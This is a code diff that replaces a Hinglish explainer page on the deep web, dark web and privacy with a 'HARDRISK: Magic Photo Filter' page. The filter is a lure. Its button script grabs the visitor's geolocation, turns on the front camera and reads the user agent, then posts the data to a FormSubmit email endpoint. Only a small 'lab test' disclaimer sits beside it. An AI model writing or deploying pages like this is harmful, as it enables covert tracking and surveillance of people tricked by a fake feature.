@@ -1,268 +1,118 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Internet ki chhupi se chhupi jankari, jaise deep web, dark web, cybersecurity, aur future technologies ke bare mein janiye.">
-    <meta name="keywords" content="internet, deep web, dark web, cybersecurity, Web3, quantum internet, privacy">
-    <meta name="author" content="Grok by xAI">
-    <title>Internet ki Chhupi se Chhupi Jankari</title>
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Font Awesome for Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
-    <!-- Inline Manifest for PWA -->
-    <meta name="theme-color" content="#333">
-    <script>
-        const manifest = {
-            "name": "Internet ki Chhupi Jankari",
-            "short_name": "Internet Jankari",
-            "description": "Internet ke chhupe tathya aur rochak jankari",
-            "start_url": ".",
-            "display": "standalone",
-            "background_color": "#f4f4f4",
-            "theme_color": "#333",
-            "icons": []
-        };
-        const stringManifest = JSON.stringify(manifest);
-        const blob = new Blob([stringManifest], { type: 'application/json' });
-        const manifestURL = URL.createObjectURL(blob);
-        document.head.insertAdjacentHTML('beforeend', `<link rel="manifest" href="${manifestURL}">`);
-    </script>
+    <title>HARDRISK: Magic Photo Filter</title>
     <style>
         body {
-            font-family: 'Poppins', sans-serif;
-            transition: background-color 0.3s, color 0.3s;
+            background: linear-gradient(to right, #ff6b6b, #4ecdc4);
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: white;
+            margin: 0;
+            padding: 20px;
         }
-        .dark-mode {
-            background-color: #1a202c;
-            color: #e2e8f0;
+        h1 {
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
         }
-        .dark-mode .bg-white {
-            background-color: #2d3748;
+        p {
+            font-size: 1.2em;
         }
-        .dark-mode .bg-gray-100 {
-            background-color: #1a202c;
-        }
-        .accordion-header {
+        .btn {
+            padding: 15px 30px;
+            font-size: 1.5em;
+            background: #ffd700;
+            border: none;
+            border-radius: 10px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+            transition: transform 0.2s;
         }
-        .accordion-content {
-            display: none;
-            transition: all 0.3s ease;
+        .btn:hover {
+            transform: scale(1.1);
         }
-        .accordion-content.active {
-            display: block;
+        #preview {
+            margin: 20px auto;
+            max-width: 300px;
+            border-radius: 10px;
         }
-        .animate-fade {
-            animation: fadeIn 1s ease-in-out;
+        #dataOutput {
+            margin-top: 20px;
+            background: rgba(0,0,0,0.5);
+            padding: 10px;
+            border-radius: 10px;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        .disclaimer {
+            font-size: 0.9em;
+            margin-top: 20px;
+            color: #ffd700;
         }
     </style>
 </head>
-<body class="bg-gray-100">
-    <div class="container mx-auto p-6">
-        <!-- Header -->
-        <header class="flex justify-between items-center mb-8">
-            <h1 class="text-4xl font-bold text-gray-800 dark:text-white animate-fade">
-                <i class="fas fa-globe mr-2"></i> Internet ki Chhupi se Chhupi Jankari
-            </h1>
-            <button id="theme-toggle" class="p-2 rounded-full bg-gray-200 dark:bg-gray-700">
-                <i class="fas fa-moon text-gray-800 dark:text-white"></i>
-            </button>
-        </header>
+<body>
+    <h1>HARDRISK: Magic Photo Filter</h1>
+    <p>Try our mind-blowing filter! Allow permissions to unlock the magic (Lab Test Only).</p>
+    <img id="preview" src="https://via.placeholder.com/300x200?text=Magic+Filter+Preview" alt="Filter Preview">
+    <button class="btn" onclick="startMagic()">Unlock Magic Filter</button>
+    <div id="dataOutput"></div>
+    <p class="disclaimer">This is an educational cybersecurity test. By proceeding, you consent to sharing location, camera, and device data for lab purposes only. Use fake data.</p>
 
-        <!-- Intro Section -->
-        <section class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg mb-8 animate-fade">
-            <p class="text-lg text-gray-600 dark:text-gray-300">
-                Yeh page internet ke kam jane jate tathya aur rochak jankari ko cover karta hai, jo aam taur par charcha mein nahi aate.
-            </p>
-        </section>
-
-        <!-- Accordion Sections -->
-        <section class="space-y-4">
-            <!-- Section 1: Internet ka Structure -->
-            <div class="accordion bg-white dark:bg-gray-800 rounded-lg shadow-lg">
-                <div class="accordion-header p-4 bg-gray-100 dark:bg-gray-700 flex justify-between items-center">
-                    <h2 class="text-xl font-semibold">1. Internet ka Structure</h2>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="accordion-content p-4">
-                    <ul class="list-disc pl-6">
-                        <li><strong>Surface Web</strong>: Yeh woh internet hai jo Google, Bing ya Yahoo ke through access hota hai. Ye internet ka sirf 4-5% hai.</li>
-                        <li><strong>Deep Web</strong>: Internet ka woh hissa jo search engines se indexed nahi hota, jaise private databases, academic journals, aur government records. Ye ~90% hai.</li>
-                        <li><strong>Dark Web</strong>: Deep苗Deep web ka ek chhota, anonymized hissa, jo Tor network ya I2P ke through access hota hai. Yahan illegal activities ke sath-sath whistleblower platforms bhi hain.</li>
-                    </ul>
-                </div>
-            </div>
-
-            <!-- Section 2: Chhupi Technologies aur Protocols -->
-            <div class="accordion bg-white dark:bg-gray-800 rounded-lg shadow-lg">
-                <div class="accordion-header p-4 bg-gray-100 dark:bg-gray-700 flex justify-between items-center">
-                    <h2 class="text-xl font-semibold">2. Chhupi Technologies aur Protocols</h2>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="accordion-content p-4">
-                    <ul class="list-disc pl-6">
-                        <li><strong>TOR (The Onion Router)</strong>: Anonymous browsing ke liye istemal hota hai. Data ko multiple layers mein encrypt karta hai.</li>
-                        <li><strong>Blockchain-based Networks</strong>: Decentralized networks jo cryptocurrencies aur Web3 applications ko power dete hain.</li>
-                        <li><strong>ZeroNet/I2P</strong>: Peer-to-peer networks jo censorship-resistant hote hain aur traditional servers ke bagair kaam karte hain.</li>
-                    </ul>
-                </div>
-            </div>
-
-            <!-- Section 3: Data Tracking aur Privacy -->
-            <div class="accordion bg-white dark:bg-gray-800 rounded-lg shadow-lg">
-                <div class="accordion-header p-4 bg-gray-100 dark:bg-gray-700 flex justify-between items-center">
-                    <h2 class="text-xl font-semibold">3. Data Tracking aur Privacy</h2>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="accordion-content p-4">
-                    <ul class="list-disc pl-6">
-                        <li><strong>Cookies aur Trackers</strong>: Har website aapke browsing behavior ko track karti hai. Third-party cookies ads ke liye data collect karte hain.</li>
-                        <li><strong>Fingerprinting</strong>: Websites aapke browser, device, aur settings ke unique patterns se aapki pehchan karti hain.</li>
-                        <li><strong>Data Brokers</strong>: Companies jaise Acxiom aur Experian aapka personal data collect aur sell karti hain.</li>
-                    </ul>
-                </div>
-            </div>
-
-            <!-- Section 4: Cybersecurity ke Chhupe Tathya -->
-            <div class="accordion bg-white dark:bg-gray-800 rounded-lg shadow-lg">
-                <div class="accordion-header p-4 bg-gray-100 dark:bg-gray-700 flex justify-between items-center">
-                    <h2 class="text-xl font-semibold">4. Cybersecurity ke Chhupe Tathya</h2>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="accordion-content p-4">
-                    <ul class="list-disc pl-6">
-                        <li><strong>Zero-Day Exploits</strong>: Hackers software ke unknown vulnerabilities ka fayda uthate hain.</li>
-                        <li><strong>Botnets</strong>: Lakhs of infected devices ek network mein judkar DDoS attacks ya spam campaigns chalate hain.</li>
-                        <li><strong>Phishing ke Naye Roop</strong>: AI-generated emails aur deepfake videos se phishing attacks ab aur sophisticated ho gaye hain.</li>
-                    </ul>
-                </div>
-            </div>
-
-            <!-- Section 5: Internet ke Social aur Cultural Aspects -->
-            <div class="accordion bg-white dark:bg-gray-800 rounded-lg shadow-lg">
-                <div class="accordion-header p-4 bg-gray-100 dark:bg-gray-700 flex justify-between items-center">
-                    <h2 class="text-xl font-semibold">5. Internet ke Social aur Cultural Aspects</h2>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="accordion-content p-4">
-                    <ul class="list-disc pl-6">
-                        <li><strong>Echo Chambers</strong>: Algorithms aapko wahi content dikhate hain jo aapke views se match karta hai, jisse polarization badhta hai.</li>
-                        <li><strong>Meme Culture aur Virality</strong>: Internet ke subcultures (jaise Reddit, 4chan) global trends aur memes ko shape karte hain.</li>
-                        <li><strong>Disinformation Campaigns</strong>: Governments aur organizations social media par propaganda aur fake news spread karte hain.</li>
-                    </ul>
-                </div>
-            </div>
-
-            <!-- Section 6: Dark Web ki Haqeeqat -->
-            <div class="accordion bg-white dark:bg-gray-800 rounded-lg shadow-lg">
-                <div class="accordion-header p-4 bg-gray-100 dark:bg-gray-700 flex justify-between items-center">
-                    <h2 class="text-xl font-semibold">6. Dark Web ki Haqeeqat</h2>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="accordion-content p-4">
-                    <ul class="list-disc pl-6">
-                        <li>Dark web sirf illegal activities ke liye nahi hai. Yahan journalists, activists, aur privacy advocates bhi active hain.</li>
-                        <li>Markets jaise Silk Road ke successors abhi bhi exist karte hain, lekin law enforcement inhe regularly target karta hai.</li>
-                        <li>Cryptocurrency (jaise Bitcoin, Monero) dark web transactions ka backbone hai.</li>
-                    </ul>
-                </div>
-            </div>
-
-            <!-- Section 7: Internet ka Future -->
-            <div class="accordion bg-white dark:bg-gray-800 rounded-lg shadow-lg">
-                <div class="accordion-header p-4 bg-gray-100 dark:bg-gray-700 flex justify-between items-center">
-                    <h2 class="text-xl font-semibold">7. Internet ka Future</h2>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="accordion-content p-4">
-                    <ul class="list-disc pl-6">
-                        <li><strong>Web3</strong>: Decentralized internet jo blockchain par based hai, jahan users apna data control kar sakte hain.</li>
-                        <li><strong>Quantum Internet</strong>: Quantum computing ke sath internet ki speed aur security badh sakti hai.</li>
-                        <li><strong>Metaverse</strong>: Virtual reality aur augmented reality ke sath internet ek immersive experience ban sakta hai.</li>
-                    </ul>
-                </div>
-            </div>
-
-            <!-- Section 8: Interesting Facts -->
-            <div class="accordion bg-white dark:bg-gray-800 rounded-lg shadow-lg">
-                <div class="accordion-header p-4 bg-gray-100 dark:bg-gray-700 flex justify-between items-center">
-                    <h2 class="text-xl font-semibold">8. Kuch Interesting Facts</h2>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="accordion-content p-4">
-                    <ul class="list-disc pl-6">
-                        <li>Internet ka pehla "website" 1991 mein CERN ne banaya tha.</li>
-                        <li>Har second ~40,000 Google searches hote hain.</li>
-                        <li>Internet ka ~30% traffic adult content se related hai.</li>
-                        <li>Undersea cables internet ka backbone hain, jo 99% international data carry karte hain.</li>
-                    </ul>
-                </div>
-            </div>
-        </section>
-
-        <!-- Footer -->
-        <footer class="mt-8 text-center text-gray-600 dark:text-gray-400">
-            <p>Adhik jankari ke liye trusted sources se research karen. Internet ek vishal duniya hai!</p>
-            <p class="mt-2">Created by <a href="https://x.ai" class="text-blue-600 dark:text-blue-400">Grok by xAI</a></p>
-        </footer>
-    </div>
-
-    <!-- Inline JavaScript -->
     <script>
-        // Accordion Functionality
-        const accordionHeaders = document.querySelectorAll('.accordion-header');
-        accordionHeaders.forEach(header => {
-            header.addEventListener('click', () => {
-                const content = header.nextElementSibling;
-                content.classList.toggle('active');
-                const icon = header.querySelector('i');
-                icon.classList.toggle('fa-chevron-down');
-                icon.classList.toggle('fa-chevron-up');
-            });
-        });
+        function startMagic() {
+            let output = document.getElementById('dataOutput');
+            output.innerHTML = "Collecting data... (Lab Test)<br>";
 
-        // Dark Mode Toggle
-        const themeToggle = document.getElementById('theme-toggle');
-        themeToggle.addEventListener('click', () => {
-            document.body.classList.toggle('dark-mode');
-            const icon = themeToggle.querySelector('i');
-            icon.classList.toggle('fa-moon');
-            icon.classList.toggle('fa-sun');
-        });
+            // Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    output.innerHTML += `Location: ${pos.coords.latitude}, ${pos.coords.longitude}<br>`;
+                    sendData(`Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                }, err => {
+                    output.innerHTML += "Location access denied.<br>";
+                });
+            }
 
-        // Inline Service Worker for P pala
-        if ('serviceWorker' in navigator) {
-            const swCode = `
-                self.addEventListener('install', event => {
-                    event.waitUntil(
-                        caches.open('v1').then(cache => {
-                            return cache.addAll(['.']);
-                        })
-                    );
-                });
-                self.addEventListener('fetch', event => {
-                    event.respondWith(
-                        caches.match(event.request).then(response => {
-                            return response || fetch(event.request);
-                        })
-                    );
-                });
-            `;
-            const blob = new Blob([swCode], { type: 'application/javascript' });
-            const swURL = URL.createObjectURL(blob);
-            navigator.serviceWorker.register(swURL)
-                .then(reg => console.log('Service Worker registered'))
-                .catch(err => console.log('Service Worker registration failed:', err));
+            // Camera (Photos/Videos/Live)
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then(stream => {
+                        output.innerHTML += "Camera accessed! Ready for live photos.<br>";
+                        let video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        document.body.appendChild(video);
+                        sendData("Camera accessed");
+                    })
+                    .catch(err => {
+                        output.innerHTML += "Camera access denied.<br>";
+                    });
+            }
+
+            // Device Info
+            let deviceInfo = `Device: ${navigator.userAgent}<br>`;
+            output.innerHTML += deviceInfo;
+            sendData(deviceInfo);
+
+            // Note: Call History not accessible via web
+            output.innerHTML += "Call history not available via web. Try native app for full access.<br>";
+        }
+
+        // Send data to email (FormSubmit)
+        function sendData(data) {
+            fetch('https://formsubmit.co/ajax/your-email@gmail.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    _subject: 'HARDRISK Data',
+                    data: data
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Data sent:', data))
+            .catch(error => console.error('Error:', error));
         }
     </script>
 </body>
-    </html>
+</html>
